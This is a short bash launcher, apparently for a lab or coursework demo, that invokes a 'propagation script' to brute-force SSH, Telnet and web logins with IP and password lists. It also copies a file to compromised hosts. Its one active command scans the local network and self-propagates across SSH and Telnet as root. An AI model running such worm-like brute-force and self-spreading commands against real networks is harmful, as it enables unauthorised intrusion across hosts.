#!/usr/bin/env bash
# For demo purposes only, runs demo.py

# Running the propagation script across numerous services (SSH, Telnet, Web)
# echo "Running the propagation script across numerous services (SSH, Telnet, Web)"
# ./src/demo.py -t src/test_files/ip_list_short.txt -p 22,25,80 -u admin -f src/test_files/passwords_list_short.txt

# Running the propagation script just across SSH
# echo "Running the propagation script just across SSH"
# ./src/demo.py -t src/test_files/ip_list_short.txt -p 22 -u root -f src/test_files/passwords_list_short.txt

# Running the propagation script just across SSH and spreading a specific file.
# echo "Running the propagation script just across SSH and spreading a specific file"
# ./src/demo.py -t src/test_files/ip_list_short.txt -p 22 -u root -f src/test_files/passwords_list_short.txt -d src/test_files/file.txt

# Running the propagation script across SSH and Telnet but acquiring IPs through a local scan and then subsequently self propagating.
echo "Running the propagation script across SSH and Telnet but acquiring IPs through a local scan and then subsequently self propagating."
./src/demo.py -L -p 22,23 -u root -f src/test_files/passwords_list_short.txt -P